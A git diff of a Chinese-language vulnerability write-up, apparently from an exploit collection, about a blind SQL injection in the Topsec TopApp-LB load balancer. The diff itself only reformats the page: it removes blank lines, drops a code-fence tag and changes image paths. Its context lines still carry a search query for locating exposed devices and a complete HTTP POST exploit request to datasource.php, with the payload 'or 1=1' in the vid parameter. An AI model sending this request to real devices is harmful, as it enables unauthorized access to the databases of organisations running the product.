@@ -22,9 +22,7 @@ app="天融信-TopApp-LB-负载均衡系统"
 
 提交以下数据包
 
-
-
-```plain
+```
 POST /acc/clsf/report/datasource.php HTTP/1.1
 Host: 
 Connection: close
@@ -44,14 +42,8 @@ Content-Length: 201
 t=l&e=0&s=t&l=1&vid=2147483647 or 1=1&gid=0&lmt=10&o=r_Speed&asc=false&p=8&lipf=&lipt=&ripf=&ript=&dscp=&proto=&lpf=&lpt=&rpf=&rpt=@。。
 ```
 
+![](../.gitbook/assets/202202091922470.png)
 
-
-![](images/202202091922470.png)
-
-
-
-![](images/202202091922937.png)
-
-
+![](../.gitbook/assets/202202091922937.png)
 
 存在SQL盲注
